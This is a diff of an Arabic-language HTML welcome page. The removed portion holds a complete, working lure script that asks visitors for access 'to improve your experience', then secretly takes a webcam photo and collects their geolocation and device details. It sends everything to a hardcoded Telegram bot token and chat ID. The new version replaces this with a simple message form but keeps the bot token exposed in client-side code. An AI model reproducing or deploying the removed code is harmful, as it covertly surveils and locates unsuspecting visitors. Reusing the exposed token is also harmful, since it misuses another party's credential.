@@ -6,23 +6,37 @@
     <title>مرحباً بك</title>
     <style>
         body {
-            background-color: #f0f8ff;
-            color: #333;
+            background-color: #ffffff;
             font-family: 'Arial', sans-serif;
-            text-align: center;
-            margin-top: 50px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
         }
         .container {
+            width: 80%;
+            max-width: 600px;
+            background: linear-gradient(to bottom right, #ffcccb, #ffebcc, #ccffcc, #ccefff);
+            border-radius: 15px;
             padding: 20px;
-            background-color: #fff;
-            border-radius: 10px;
-            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);
-            display: inline-block;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            text-align: center;
             animation: fadeIn 1.5s ease-in-out;
         }
         h1 {
-            color: #4CAF50;
+            color: #4A90E2;
             font-size: 2.5em;
+            margin-bottom: 20px;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #4A90E2;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            font-size: 1.1em;
+            text-align: center;
         }
         button {
             padding: 12px 25px;
@@ -31,10 +45,14 @@
             border: none;
             border-radius: 5px;
             cursor: pointer;
-            font-size: 1.1em;
+            font-size: 1.2em;
         }
         button:hover {
             background-color: #45a049;
+        }
+        footer {
+            margin-top: 30px;
+            color: #777;
         }
         @keyframes fadeIn {
             from { opacity: 0; }
@@ -45,128 +63,35 @@
 <body>
     <div class="container">
         <h1>مرحباً بك في موقعنا!</h1>
-        <p>يرجى السماح للوصول إلى معلومات الجهاز، الكاميرا، والموقع لتحسين تجربتك.</p>
-        <button onclick="requestPermissions()">السماح بالوصول</button>
+        <p>يرجى إدخال رسالتك في الحقل أدناه:</p>
+        <input type="text" id="messageInput" placeholder="اكتب رسالتك هنا...">
+        <button onclick="sendMessage()">إرسال</button>
+
+        <footer>
+            <p>شكراً لزيارتك!</p>
+        </footer>
     </div>
 
     <script>
-        function requestPermissions() {
-            // طلب إذن الوصول إلى الكاميرا
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(stream => {
-                    captureImage(stream);
-                })
-                .catch(err => {
-                    alert("لم يتم الحصول على إذن الكاميرا.");
-                });
-
-            // طلب إذن الموقع
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendLocation);
-            } else {
-                alert("الموقع غير مدعوم من المتصفح.");
+        function sendMessage() {
+            const message = document.getElementById('messageInput').value;
+            if (message.trim() === "") {
+                alert("يرجى كتابة رسالة أولاً.");
+                return;
             }
 
-            // جمع معلومات الجهاز
-            collectDeviceInfo();
-        }
-
-        function captureImage(stream) {
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.play();
-
-            const canvas = document.createElement('canvas');
-            const context = canvas.getContext('2d');
-            video.addEventListener('loadedmetadata', () => {
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const imageData = canvas.toDataURL('image/png');
-
-                // إرسال الصورة إلى البوت
-                sendImageToTelegram(imageData);
-
-                // إيقاف الكاميرا
-                stream.getTracks().forEach(track => track.stop());
-            });
-        }
-
-        function sendImageToTelegram(imageData) {
             const botToken = "6604522716:AAFDrWCrOLf8k5lRDp5TyI1VbL9kcMPuwR4";
-            const chatId = "1854384004";
-            const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
-
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('photo', imageData);
-
-            fetch(url, {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                    alert("تم إرسال الصورة بنجاح.");
-                } else {
-                    alert("حدث خطأ أثناء إرسال الصورة.");
-                }
-            })
-            .catch(error => {
-                console.error("Error:", error);
-            });
-        }
-
-        function sendLocation(position) {
-            const botToken = "6604522716:AAFDrWCrOLf8k5lRDp5TyI1VbL9kcMPuwR4";
-            const chatId = "1854384004";
-            const latitude = position.coords.latitude;
-            const longitude = position.coords.longitude;
-
-            const url = `https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`;
-
-            fetch(url)
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok) {
-                        alert("تم إرسال الموقع بنجاح.");
-                    } else {
-                        alert("حدث خطأ أثناء إرسال الموقع.");
-                    }
-                })
-                .catch(error => {
-                    console.error("Error:", error);
-                });
-        }
-
-        function collectDeviceInfo() {
-            const deviceInfo = {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screenWidth: screen.width,
-                screenHeight: screen.height
-            };
-
-            // إرسال المعلومات إلى البوت
-            sendToTelegram(deviceInfo);
-        }
-
-        function sendToTelegram(info) {
-            const botToken = "6604522716:AAFDrWCrOLf8k5lRDp5TyI1VbL9kcMPuwR4";
-            const chatId = "1854384004";
-            const message = `معلومات الجهاز:\nنظام التشغيل: ${info.platform}\nالمتصفح: ${info.userAgent}\nلغة المتصفح: ${info.language}\nدقة الشاشة: ${info.screenWidth}x${info.screenHeight}`;
-
+            const chatId = "1854384004";  // آيدي الأدمن
             const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
             fetch(url)
                 .then(response => response.json())
                 .then(data => {
                     if (data.ok) {
-                        alert("تم إرسال المعلومات بنجاح.");
+                        alert("تم إرسال الرسالة بنجاح.");
+                        document.getElementById('messageInput').value = "";  // مسح الحقل بعد الإرسال
                     } else {
-                        alert("حدث خطأ أثناء إرسال المعلومات.");
+                        alert("حدث خطأ أثناء إرسال الرسالة.");
                     }
                 })
                 .catch(error => {
